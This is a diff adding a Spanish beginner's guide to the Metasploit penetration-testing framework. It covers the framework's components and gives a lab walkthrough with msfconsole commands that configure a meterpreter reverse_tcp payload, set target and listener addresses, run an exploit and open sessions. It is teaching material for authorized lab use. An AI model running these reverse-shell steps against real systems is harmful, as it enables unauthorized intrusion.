@@ -1,0 +1,54 @@
+¿Qué es Metasploit? 🤔🛠️
+Metasploit es un framework (conjunto de herramientas) para pruebas de penetración y explotación. Piensa en él como una caja de herramientas para pentesters: 
+dentro tienes martillos (exploits), llaves (payloads), linternas (auxiliary) y manuales (documentación) que te ayudan a encontrar y explotar vulnerabilidades en 
+entornos controlados.
+
+Analogía: es como un taller mecánico donde cada herramienta sirve para probar piezas de un coche; si trabajas en el coche del vecino sin permiso, es ilegal. 🚗🔧
+
+¿Para qué sirve? 🎯
+Explorar y verificar vulnerabilidades en sistemas de prueba.
+Crear y manejar payloads (cargas) para pruebas controladas.
+Ejecutar módulos auxiliares: escaneo, fuzzing, recolección de info.
+Gestionar sesiones (p. ej. Meterpreter) para post-explotación en laboratorios.
+Automatizar flujos de pruebas de seguridad.
+
+Componentes clave 🔑
+msfconsole: la interfaz principal (CLI) — el "tablero" del taller.
+msfvenom: herramienta para generar payloads/binarios (cuando lo necesites en laboratorio).
+Módulos:
+
+exploit/* — scripts para aprovechar una vulnerabilidad.
+payload/* — código que se ejecuta en el objetivo (p. ej. reverse shell).
+auxiliary/* — escáneres, fuzzers, sniffers.
+post/* — recolección de info y tareas tras obtener acceso.
+db (Metasploit DB): base de datos integrada para guardar hosts, servicios y resultados de escaneo.
+
+Cómo se usa (flujo general, en un laboratorio) 🧭
+Preparación: ejecuta Kali y un objetivo de laboratorio (ej. Metasploitable). Asegúrate de estar en la misma red virtual. 🖥️🖥️
+
+Arrancar msfconsole:
+sudo msfdb init    # (si no está inicializada)
+msfconsole
+
+Buscar módulos: usa search para encontrar exploits o auxiliares:
+search vsftpd
+
+Seleccionar módulo:
+use exploit/unix/ftp/some_exploit    # ejemplo genérico
+
+Ver opciones:
+show options
+
+Configurar parámetros:
+set RHOST 192.168.56.101
+set RPORT 21
+set PAYLOAD linux/x86/meterpreter/reverse_tcp   # ejemplo conceptual
+set LHOST 192.168.56.1
+set LPORT 4444
+
+Ejecutar:
+exploit / run
+
+Gestionar sesiones:
+sessions -l
+sessions -i 1
